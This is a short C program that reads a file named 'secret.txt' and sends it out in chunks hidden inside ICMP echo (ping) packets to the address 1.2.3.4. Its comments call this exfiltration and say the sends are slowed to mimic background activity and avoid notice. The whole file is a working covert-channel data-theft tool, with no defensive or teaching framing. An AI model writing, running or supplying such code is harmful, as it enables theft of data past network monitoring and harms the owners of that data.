#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>

// Standard checksum
unsigned short calculate_checksum(void *data, unsigned int bytes) {
    unsigned short *data_pointer = (unsigned short *)data;
    unsigned int total_sum = 0;
    while (bytes > 1) {
        total_sum += *data_pointer++;
        bytes -= 2;
    }
    if (bytes > 0)
        total_sum += *((unsigned char *)data_pointer);
    while (total_sum >> 16)
        total_sum = (total_sum & 0xFFFF) + (total_sum >> 16);
    return (~((unsigned short)total_sum));
}

int main() {
    // Requirements: Send packets to 1.2.3.4 
    const char *target_ip = "1.2.3.4";
    const char *file_path = "secret.txt"; // Target file to exfiltrate [cite: 230]
    
    FILE *fp = fopen(file_path, "r");
    if (!fp) {
        perror("File error");
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    char buffer[1024]; // Payload buffer
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        // Construct ICMP packet with data as payload 
        int packet_size = sizeof(struct icmphdr) + n;
        char *packet = malloc(packet_size);
        
        struct icmphdr *icmp = (struct icmphdr *)packet;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = getpid();
        icmp->un.echo.sequence = 0;
        icmp->checksum = 0;
        
        memcpy(packet + sizeof(struct icmphdr), buffer, n);
        icmp->checksum = calculate_checksum(packet, packet_size);

        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        free(packet);
        usleep(100000); // Slow down to mimic background activity 
    }

    fclose(fp);
    close(sock);
    return 0;
}